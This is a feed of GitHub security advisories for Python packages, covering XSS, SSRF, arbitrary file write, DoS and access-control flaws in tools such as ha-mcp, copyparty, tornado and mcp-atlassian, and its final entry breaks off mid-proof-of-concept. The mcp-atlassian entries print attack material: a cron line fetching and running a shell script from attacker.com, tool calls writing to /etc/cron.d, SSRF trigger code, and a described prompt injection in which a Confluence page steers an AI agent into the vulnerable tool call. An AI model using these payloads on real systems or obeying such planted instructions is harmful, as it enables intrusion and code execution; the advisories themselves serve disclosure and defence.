<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-12T17:15:57.592Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ha-mcp] ha-mcp has XSS via Unescaped HTML in OAuth Consent Form]]></title>
        <id>https://github.com/advisories/GHSA-pf93-j98v-25pv</id>
        <link href="https://github.com/advisories/GHSA-pf93-j98v-25pv"/>
        <updated>2026-03-12T14:23:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The ha-mcp OAuth consent form renders user-controlled parameters via Python f-strings with no HTML escaping. An attacker who can reach the OAuth endpoint and convince the server operator to follow a crafted authorization URL could execute JavaScript in the operator's browser. This affects only users running the beta OAuth mode (<code>ha-mcp-oauth</code>), which is not part of the standard setup and requires explicit configuration.</p>
<h3 id="details">Details</h3>
<p><strong>Unescaped f-string rendering</strong></p>
<p><code>consent_form.py</code> builds HTML using Python f-strings. No call to <code>html.escape()</code> exists anywhere in the file. The following values are rendered unescaped:</p>
<ul>
<li><code>client_name</code> / <code>client_id</code> — in HTML element context (lines 299, 303)</li>
<li><code>client_id</code>, <code>redirect_uri</code>, <code>state</code> — in HTML attribute context (lines 310–312), where a <code>"</code> character breaks out of <code>value=""</code></li>
<li><code>error_message</code>, <code>error</code>, <code>error_description</code> — in error display paths (lines 36–40, 496–497)</li>
</ul>
<p>An attacker can register a client with a malicious <code>client_name</code> via the <code>/register</code> (DCR) endpoint, which accepts <code>client_name</code> without sanitization. If the server operator then visits a crafted authorization URL for that client, the payload executes in their browser.</p>
<p><strong>Open Dynamic Client Registration</strong></p>
<p>DCR is enabled by default with no initial access token required. This is intentional: Claude.ai and ChatGPT must self-register on first use, which is the standard MCP OAuth flow (RFC 7591). Requiring a pre-shared token would break those integrations. Registration alone grants no access — authorization requires an explicit action by the server operator.</p>
<h3 id="impact">Impact</h3>
<p><strong>Affected configuration:</strong> OAuth mode only (<code>ha-mcp-oauth</code>, requires <code>MCP_BASE_URL</code>). This mode is in beta and is not included in the main setup documentation. The vast majority of ha-mcp users run stdio mode, which is not affected.</p>
<p><strong>Attack requirements:</strong></p>
<ol>
<li>The attacker can reach the ha-mcp OAuth endpoint (it binds to <code>0.0.0.0</code> in HTTP mode)</li>
<li>The attacker registers a malicious client via <code>/register</code></li>
<li>The attacker convinces the <strong>server operator</strong> — the person who set up ha-mcp — to follow a crafted authorization URL for an unrecognized application</li>
</ol>
<p>Step 3 is a meaningful social engineering bar: the consent form displays the (unfamiliar) application name, and the operator has no legitimate reason to authorize an OAuth client they didn't initiate through Claude.ai or ChatGPT. Normal usage involves being redirected to the consent form from one of those platforms, not from an external link.</p>
<p>If exploited, a JavaScript payload could exfiltrate data entered into the consent form, including the Home Assistant Long-Lived Access Token.</p>
<h3 id="fix">Fix</h3>
<p>Upgrade to 7.0.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-pf93-j98v-25pv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32112">https://nvd.nist.gov/vuln/detail/CVE-2026-32112</a></li>
<li><a href="https://github.com/advisories/GHSA-pf93-j98v-25pv">https://github.com/advisories/GHSA-pf93-j98v-25pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf93-j98v-25pv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-12T14:23:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ha-mcp] ha-mcp OAuth 2.1 DCR mode enables network reconnaissance via an error oracle]]></title>
        <id>https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</id>
        <link href="https://github.com/advisories/GHSA-fmfg-9g7c-3vq7"/>
        <updated>2026-03-12T14:23:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The ha-mcp OAuth consent form (beta feature) accepts a user-supplied <code>ha_url</code> and makes a server-side HTTP request to <code>{ha_url}/api/config</code> with no URL validation. An unauthenticated attacker can submit arbitrary URLs to perform internal network reconnaissance via an error oracle. Two additional code paths in OAuth tool calls (REST and WebSocket) are affected by the same primitive.</p>
<p>The primary deployment method (private URL with pre-configured <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>
<h3 id="details">Details</h3>
<p><strong>Code path 1 — Consent form validation</strong> (reported)</p>
<p>When a user submits the OAuth consent form, <code>_validate_ha_credentials()</code> (<code>provider.py</code>) makes a server-side GET request to <code>{ha_url}/api/config</code> with no scheme, IP, or domain validation. Different exception types produce distinct error messages, creating an error oracle:</p>
<table>
<thead>
<tr>
<th>Outcome</th>
<th>Message returned</th>
<th>Information leaked</th>
</tr>
</thead>
<tbody><tr>
<td><code>ConnectError</code></td>
<td>"Could not connect..."</td>
<td>Host down or port closed</td>
</tr>
<tr>
<td><code>TimeoutException</code></td>
<td>"Connection timed out..."</td>
<td>Host up, port filtered</td>
</tr>
<tr>
<td>HTTP 401</td>
<td>"Invalid access token..."</td>
<td>Service alive, requires auth</td>
</tr>
<tr>
<td>HTTP 403</td>
<td>"Access forbidden..."</td>
<td>Service alive, forbidden</td>
</tr>
<tr>
<td>HTTP ≥ 400</td>
<td>"Failed to connect: HTTP {N}"</td>
<td>Service alive, exact status</td>
</tr>
</tbody></table>
<p>An attacker can drive the flow programmatically: register a client via open DCR (<code>POST /register</code>), initiate authorization, extract a <code>txn_id</code>, and submit arbitrary <code>ha_url</code> values. No user interaction required.</p>
<p><strong>Code path 2 — REST tool calls with forged token</strong></p>
<p>OAuth access tokens are stateless base64-encoded JSON payloads (<code>{"ha_url": "...", "ha_token": "..."}</code>). Since tokens are not signed, an attacker can forge a token with an arbitrary <code>ha_url</code>. REST tool calls then make HTTP requests to hardcoded HA API paths on that host (<code>/config</code>, <code>/states</code>, <code>/services</code>, etc.). JSON responses are returned to the caller.</p>
<p>In practice, path control is limited — most endpoints use absolute paths that ignore the <code>ha_url</code> path component. Useful exfiltration requires the target to return JSON at HA API paths, which is unlikely for non-HA services.</p>
<p><strong>Code path 3 — WebSocket tool calls with forged token</strong></p>
<p>The same forged token triggers WebSocket connections to <code>ws://{ha_url}/api/websocket</code>. The client follows the HA WebSocket handshake protocol (waits for <code>auth_required</code>, sends <code>auth</code>, expects <code>auth_ok</code>). Non-HA targets fail at the protocol level and return nothing useful. Realistic exploitation is limited to pivoting to another HA instance on the internal network.</p>
<h3 id="impact">Impact</h3>
<p><strong>Confirmed:</strong> Internal network reconnaissance via error oracle (all 3 code paths). An attacker can map reachable hosts and open ports from the server's network position.</p>
<h3 id="scope">Scope</h3>
<p>OAuth mode is a <strong>beta</strong> feature, documented separately in <code>docs/OAUTH.md</code> and not part of the main setup instructions. The standard deployment method (pre-configured <code>HOMEASSISTANT_URL</code> and <code>HOMEASSISTANT_TOKEN</code>) is not affected.</p>
<h3 id="fix">Fix</h3>
<p>Upgrade to 7.0.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7">https://github.com/homeassistant-ai/ha-mcp/security/advisories/GHSA-fmfg-9g7c-3vq7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32111">https://nvd.nist.gov/vuln/detail/CVE-2026-32111</a></li>
<li><a href="https://github.com/advisories/GHSA-fmfg-9g7c-3vq7">https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fmfg-9g7c-3vq7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-12T14:23:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[copyparty] Copyparty has unexpected JavaScript execution via crafted URL to folder with `.prologue.html`]]></title>
        <id>https://github.com/advisories/GHSA-rcp6-88mm-9vgf</id>
        <link href="https://github.com/advisories/GHSA-rcp6-88mm-9vgf"/>
        <updated>2026-03-12T14:22:54.000Z</updated>
        <content type="html"><![CDATA[<p>If an attacker has been given both read- and write-permissions to the server, they can upload a malicious file with the filename <code>.prologue.html</code> and then craft a link to potentially execute arbitrary JavaScript in the victim's context.</p>
<p>Note that it is intended behavior that the JavaScript would execute if the target clicks a link to the HTML file itself; "<a href="https://example.com/foo/.prologue.html">https://example.com/foo/.prologue.html</a>". The vulnerability is that "<a href="https://example.com/foo/?b">https://example.com/foo/?b</a>" would also evaluate the file, making the behavior unexpected.</p>
<p>There are existing preventative measures (strict SameSite cookies) which makes it harder to leverage this vulnerability in an attack; in order to gain control of the target's authenticated session, the link must be clicked from a page served by the server itself -- most likely by editing an existing resource, which would require additional access permissions.</p>
<p>Finally, for this attack to be successful, the attacker's target must click the specific crafted link given by the attacker. This vulnerability is not activated by normally browsing the web-UI on the server.</p>
<h2 id="impact">Impact</h2>
<p>If successful, the malicious JavaScript could move or delete existing files on the server, or upload new files, using the account of the person who opens the link.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf">https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32109">https://nvd.nist.gov/vuln/detail/CVE-2026-32109</a></li>
<li><a href="https://github.com/advisories/GHSA-rcp6-88mm-9vgf">https://github.com/advisories/GHSA-rcp6-88mm-9vgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcp6-88mm-9vgf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-12T14:22:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[copyparty] Copyparty ftp/sftp: Sharing a single file did not fully restrict source-folder access]]></title>
        <id>https://github.com/advisories/GHSA-67rw-2x62-mqqm</id>
        <link href="https://github.com/advisories/GHSA-67rw-2x62-mqqm"/>
        <updated>2026-03-12T14:22:47.000Z</updated>
        <content type="html"><![CDATA[<p>There was a missing permission-check in the shares feature (the <code>shr</code> global-option).</p>
<p>This vulnerability only applies in the following scenario:</p>
<ul>
<li>The <a href="https://github.com/9001/copyparty/#shares">shares</a> feature is used for the specific purpose of creating a share of just a single file inside a folder</li>
<li>Either the FTP or SFTP server is enabled, and also made publically accessible<ul>
<li>If a share is password-protected, then SFTP was not vulnerable unless the <code>sftp-pw</code> global-option was also enabled</li>
</ul>
</li>
</ul>
<p>Given these conditions, when a user is browsing a share through either FTP or SFTP (not http or https), they can gain read-access to the remaining files inside the shared folder by guessing/bruteforcing the filenames.</p>
<p>It was not possible to descend into subdirectories in this manner; only the sibling files were accessible.</p>
<p>This issue did not affect filekeys or dirkeys.</p>
<p>This vulnerability is <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58753">CVE-2025-58753</a> which was previously fixed for HTTP and HTTPS, but not for FTP. The FTPS server did not yet exist at that time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm">https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32108">https://nvd.nist.gov/vuln/detail/CVE-2026-32108</a></li>
<li><a href="https://github.com/advisories/GHSA-67rw-2x62-mqqm">https://github.com/advisories/GHSA-67rw-2x62-mqqm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rw-2x62-mqqm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-12T14:22:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado is vulnerable to DoS due to too many multipart parts]]></title>
        <id>https://github.com/advisories/GHSA-qjxf-f2mg-c6mc</id>
        <link href="https://github.com/advisories/GHSA-qjxf-f2mg-c6mc"/>
        <updated>2026-03-12T14:19:53.000Z</updated>
        <content type="html"><![CDATA[<p>In versions of Tornado prior to 6.5.5, the only limit on the number of parts in <code>multipart/form-data</code> is the <code>max_body_size</code> setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts. </p>
<p>Tornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see <code>tornado.httputil.ParseMultipartConfig</code>. It is also now possible to disable <code>multipart/form-data</code> parsing entirely if it is not required for the application.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc">https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31958">https://nvd.nist.gov/vuln/detail/CVE-2026-31958</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839">https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839</a></li>
<li><a href="https://github.com/tornadoweb/tornado/releases/tag/v6.5.5">https://github.com/tornadoweb/tornado/releases/tag/v6.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-qjxf-f2mg-c6mc">https://github.com/advisories/GHSA-qjxf-f2mg-c6mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjxf-f2mg-c6mc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-12T14:19:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado has incomplete validation of cookie attributes]]></title>
        <id>https://github.com/advisories/GHSA-78cv-mqj4-43f7</id>
        <link href="https://github.com/advisories/GHSA-78cv-mqj4-43f7"/>
        <updated>2026-03-11T22:17:04.000Z</updated>
        <content type="html"><![CDATA[<p>Values passed to the <code>domain</code>, <code>path</code>, and <code>samesite</code> arguments of <code>RequestHandler.set_cookie</code> were not completely validated in versions of Tornado prior to 6.5.5. In particular, semicolons would be allowed, which could be used to inject attacker-controlled values for other cookie attributes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7">https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7</a></li>
<li><a href="https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104">https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104</a></li>
<li><a href="https://github.com/tornadoweb/tornado/releases/tag/v6.5.5">https://github.com/tornadoweb/tornado/releases/tag/v6.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-78cv-mqj4-43f7">https://github.com/advisories/GHSA-78cv-mqj4-43f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78cv-mqj4-43f7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-11T22:17:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: manipulated stream length values can exhaust RAM]]></title>
        <id>https://github.com/advisories/GHSA-hqmh-ppp3-xvm7</id>
        <link href="https://github.com/advisories/GHSA-hqmh-ppp3-xvm7"/>
        <updated>2026-03-11T05:46:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing a content stream with a rather large <code>/Length</code> value, regardless of the actual data length inside the stream.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.8.0">pypdf==6.8.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3675">#3675</a>.</p>
<p>As far as we are aware, this mostly affects reading from buffers of unknown size, as returned by <code>open("file.pdf", mode="rb")</code> for example. Passing a file path or a <code>BytesIO</code> buffer to <em>pypdf</em> instead does not seem to trigger the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-hqmh-ppp3-xvm7">https://github.com/py-pdf/pypdf/security/advisories/GHSA-hqmh-ppp3-xvm7</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3675">https://github.com/py-pdf/pypdf/pull/3675</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/3c550b3196adeba1506a26e57c09c09fac75e9aa">https://github.com/py-pdf/pypdf/commit/3c550b3196adeba1506a26e57c09c09fac75e9aa</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.8.0">https://github.com/py-pdf/pypdf/releases/tag/6.8.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31826">https://nvd.nist.gov/vuln/detail/CVE-2026-31826</a></li>
<li><a href="https://github.com/advisories/GHSA-hqmh-ppp3-xvm7">https://github.com/advisories/GHSA-hqmh-ppp3-xvm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqmh-ppp3-xvm7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-11T00:14:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-unicorn] django-unicorn affected by component state manipulation via unvalidated attribute access]]></title>
        <id>https://github.com/advisories/GHSA-ffv6-jj46-x367</id>
        <link href="https://github.com/advisories/GHSA-ffv6-jj46-x367"/>
        <updated>2026-03-11T05:45:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Component state manipulation is possible in <code>django-unicorn</code> due to missing access control checks during property updates and method calls. An attacker can bypass the intended <code>_is_public</code> protection to modify internal attributes such as <code>template_name</code> or trigger protected methods.</p>
<h2 id="vulnerability-details-component-access-control-bypass">Vulnerability Details: Component Access Control Bypass</h2>
<p>Security analysis identified that the framework fails to enforce visibility boundaries defined by <code>_is_public</code> within the action parsers. Specifically, the logic in <code>set_property_value()</code> and <code>_call_method_name()</code> utilizes <code>getattr</code> and <code>setattr</code> directly on component instances without verifying if the target attribute or method is explicitly marked as public.</p>
<p>Vulnerability resides in:</p>
<ul>
<li><code>src/django_unicorn/views/action_parsers/call_method.py</code></li>
<li><code>src/django_unicorn/views/action_parsers/utils.py</code></li>
</ul>
<p>While Django's template engine restricts rendering to registered directories, an unauthorized user can still force a component to render sensitive templates (e.g., admin layouts) from other installed applications or reset the component state by invoking the internal <code>reset()</code> method.</p>
<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
<p>Attacker can overwrite the <code>template_name</code> attribute by sending a crafted JSON payload to the message endpoint:</p>
<ol>
<li>Construct a payload targeting a protected attribute:<pre><code class="language-json">{
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": { "name": "template_name", "value": "admin/base.html" }
    }
  ],
  "data": {},
  "meta": "&lt;checksum_of_empty_dict&gt;"
}
</code></pre>
</li>
<li>The server-side component updates its internal state: <code>self.template_name = "admin/base.html"</code>.</li>
<li>Subsequent re-rendering displays the content of the targeted template, bypassing intended component logic.</li>
</ol>
<h2 id="impact">Impact</h2>
<p>Low severity. The risk is limited to unauthorized manipulation of component state and rendering of existing templates within the application's configured template directories. Remote Code Execution (RCE) is not possible via this vector.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367">https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31815">https://nvd.nist.gov/vuln/detail/CVE-2026-31815</a></li>
<li><a href="https://github.com/advisories/GHSA-ffv6-jj46-x367">https://github.com/advisories/GHSA-ffv6-jj46-x367</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffv6-jj46-x367</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-11T00:11:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-atlassian] MCP Atlassian has an arbitrary file write leading to arbitrary code execution via unconstrained download_path in confluence_download_attachment]]></title>
        <id>https://github.com/advisories/GHSA-xjgw-4wvw-rgm4</id>
        <link href="https://github.com/advisories/GHSA-xjgw-4wvw-rgm4"/>
        <updated>2026-03-10T18:56:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>confluence_download_attachment</code> MCP tool accepts a <code>download_path</code> parameter that is written to without any directory boundary enforcement. An attacker who can call this tool and supply or access a Confluence attachment with malicious content can write arbitrary content to any path the server process has write access to. Because the attacker controls both the write destination and the written content (via an uploaded Confluence attachment), this constitutes for arbitrary code execution (for example, writing a valid cron entry to <code>/etc/cron.d/</code> achieves code execution within one scheduler cycle with no server restart required).</p>
<h3 id="details">Details</h3>
<p>The tool parameter is defined in <code>src/mcp_atlassian/servers/confluence.py:~1275</code> without any path restriction:</p>
<pre><code class="language-python">download_path: Annotated[
    str,
    Field(
        description=(
            "Full path where the file should be saved. Can be absolute or relative. "
            "Examples: './downloads/report.pdf', '/tmp/image.png', 'C:\\\\temp\\\\file.docx'. "
            "Parent directory will be created if it doesn't exist."
        )
    ),
],

 The implementation at src/mcp_atlassian/confluence/attachments.py:183–200:

if not os.path.isabs(target_path):
    target_path = os.path.abspath(target_path)  # normalizes path, no restriction

os.makedirs(os.path.dirname(target_path), exist_ok=True)  # creates any directory
with open(target_path, "wb") as f:                        # writes to any writable path
    for chunk in response.iter_content(chunk_size=8192):
        f.write(chunk)

 os.path.abspath() converts relative paths to absolute but performs no directory boundary check. No configurable base download directory is enforced. There is no validation between the tool parameter and the file write. The same issue exists in download_content_attachments via its target_dir parameter (src/mcp_atlassian/servers/confluence.py:~1389).


### PoC
Prerequisites: Confluence credentials with access to at least one page. To control the written file content, upload a malicious attachment to any Confluence page you have write access to.

Step 1 — Prepare the payload. Create a file containing a valid cron entry and upload it as a Confluence attachment:

* * * * * root curl http://attacker.com/shell.sh | bash

Step 2 — Call the tool with a sensitive write target:

{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
        "name": "confluence_download_attachment",
        "arguments": {
            "page_id": "&lt;page id hosting the malicious attachment&gt;",
            "attachment_id": "&lt;attachment id&gt;",
            "download_path": "/etc/cron.d/mcp-backdoor"
        }
    },
    "id": 1
}

The attachment content is written verbatim to /etc/cron.d/mcp-backdoor. The system scheduler executes it within one minute with no further attacker action required.

Alternative potential write targets demonstrating broader impact:
- /home/&lt;user&gt;/.ssh/authorized_keys - persistent SSH backdoor
- &lt;venv&gt;/lib/python3.x/site-packages/&lt;any_imported_module&gt;.py - code execution on next import
- ~/.bashrc - code execution on next user login

### Impact
An attacker who can invoke MCP tools and upload (or access) a Confluence attachment with controlled content can achieve arbitrary code execution on the server host. The MCP HTTP transport endpoints carry no authentication by default, meaning any host that can reach the server's HTTP port can call tools using the server's own embedded Confluence credentials (global fallback). The default HOST=0.0.0.0 binding makes this reachable from the local network without any configuration change.

In enterprise deployments where Confluence write access is broadly granted, the effective attacker prerequisite reduces to network access to the MCP HTTP port. This is also reachable without direct network access: a malicious Confluence page can embed LLM instructions directing an AI agent to call confluence_download_attachment with attacker-specified parameters, achieving code execution through the agent as an unwitting intermediary.

Example potential RCE paths:
 1. Cron job injection - write a cron entry to /etc/cron.d/; executes within one scheduler cycle, no restart required
 2. Python package hijack - overwrite any .py module in the application's virtual environment; executes on next import or server restart.
 3. SSH authorized_keys - write an attacker-controlled public key; grants persistent interactive shell access.
 4. Shell profile injection - write to ~/.bashrc or ~/.profile; executes on next user login.
### References

- &lt;https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-xjgw-4wvw-rgm4&gt;
- &lt;https://github.com/sooperset/mcp-atlassian/commit/52b9b0997681e87244b20d58034deae89c91631e&gt;
- &lt;https://github.com/advisories/GHSA-xjgw-4wvw-rgm4&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xjgw-4wvw-rgm4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-10T18:56:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-atlassian] MCP Atlassian has SSRF via unvalidated X-Atlassian-Jira-Url / X-Atlassian-Confluence-Url headers]]></title>
        <id>https://github.com/advisories/GHSA-7r34-79r5-rcc9</id>
        <link href="https://github.com/advisories/GHSA-7r34-79r5-rcc9"/>
        <updated>2026-03-10T18:48:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unauthenticated attacker who can reach the mcp-atlassian HTTP endpoint can force the server process to make outbound HTTP requests to an arbitrary attacker-controlled URL by supplying two custom HTTP headers without an <code>Authorization</code> header. No authentication is required. The vulnerability exists in the HTTP middleware and dependency injection layer — not in any MCP tool handler - making it invisible to tool-level code analysis. In cloud deployments, this could enable theft of IAM role credentials via the instance metadata endpoint (<code>169.254.169.254</code>). In any HTTP deployment it enables internal network reconnaissance and injection of attacker-controlled content into LLM tool results.</p>
<h3 id="details">Details</h3>
<p>The server supports a multi-tenant HTTP authentication mode where clients supply per-request Jira/Confluence URLs via custom headers. The middleware (<code>src/mcp_atlassian/servers/main.py:436–448</code>) extracts <code>X-Atlassian-Jira-Url</code> from the request and stores it in request state with no validation. The dependency provider (<code>src/mcp_atlassian/servers/dependencies.py:189–217</code>) then uses this value directly as the <code>url=</code> parameter when constructing a <code>JiraConfig</code> and <code>JiraFetcher</code>. The first method call on the fetcher (<code>get_current_user_account_id()</code>) immediately issues a <code>GET</code> request to <code>{header_url}/rest/api/2/myself</code> — an outbound SSRF call to the attacker-controlled URL.</p>
<p>No comparison is made against the server-configured <code>JIRA_URL</code> environment variable. No private IP range blocklist is applied. No URL scheme allowlist is enforced.</p>
<p>  <strong>Trigger conditions — all four must hold:</strong></p>
<ol>
<li>Server running with <code>--transport streamable-http</code> or <code>--transport sse</code></li>
<li>Request contains <code>X-Atlassian-Jira-Url</code> header (any non-empty value)</li>
<li>Request contains <code>X-Atlassian-Jira-Personal-Token</code> header (any non-empty value)</li>
<li>Request has <strong>no</strong> <code>Authorization</code> header</li>
</ol>
<p>  An identical vulnerability exists for Confluence at <code>dependencies.py:341–393</code> via <code>X-Atlassian-Confluence-Url</code> +
  <code>X-Atlassian-Confluence-Personal-Token</code>.</p>
<p>  <strong>Root cause - middleware</strong> (<code>src/mcp_atlassian/servers/main.py:436–448</code>):</p>
<pre><code class="language-python"># When service headers are present and no Authorization header is provided,
# auth type is set to "pat" but user_atlassian_token is NOT set.
# This is what routes execution to the vulnerable path below.
if service_headers and (jira_token_str and jira_url_str):
    scope["state"]["user_atlassian_auth_type"] = "pat"

Root cause - dependency provider (src/mcp_atlassian/servers/dependencies.py:189–217):
if (
    user_auth_type == "pat"
    and jira_url_header           # attacker-controlled, no validation
    and jira_token_header
    and not hasattr(request.state, "user_atlassian_token")
):
    header_config = JiraConfig(
        url=jira_url_header,      # used directly, no allowlist check
        personal_token=jira_token_header,
        ...
    )
    header_jira_fetcher = JiraFetcher(config=header_config)
    header_jira_fetcher.get_current_user_account_id()
    # ^ GET {jira_url_header}/rest/api/2/myself — outbound SSRF call
    request.state.jira_fetcher = header_jira_fetcher  # cached for all tool calls this request


### PoC
Step 1 - Start a listener to capture the inbound SSRF request:

# listener.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sys

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[SSRF RECEIVED] Path: {self.path}", file=sys.stderr)
        print(f"[SSRF RECEIVED] Headers: {dict(self.headers)}", file=sys.stderr)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        if "myself" in self.path:
            self.wfile.write(json.dumps({
                "accountId": "ssrf-confirmed",
                "displayName": "SSRF PoC"
            }).encode())
        else:
            self.wfile.write(b"{}")
    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()

Step 2 - Start mcp-atlassian in HTTP transport mode (placeholder credentials are sufficient — the vulnerable path is reached before any real Atlassian instance is contacted):

JIRA_URL=https://placeholder.atlassian.net \
JIRA_API_TOKEN=placeholder \
mcp-atlassian --transport streamable-http --port 8000

Step 3 — Trigger the SSRF:

import httpx, json

MCP    = "http://localhost:8000/mcp"
ATTACK = "http://&lt;listener-ip&gt;:8888"

# Initialize MCP session
r = httpx.post(MCP, json={
    "jsonrpc": "2.0", "method": "initialize",
    "params": {"protocolVersion": "2024-11-05", "capabilities": {},
               "clientInfo": {"name": "poc", "version": "1.0"}},
    "id": 1
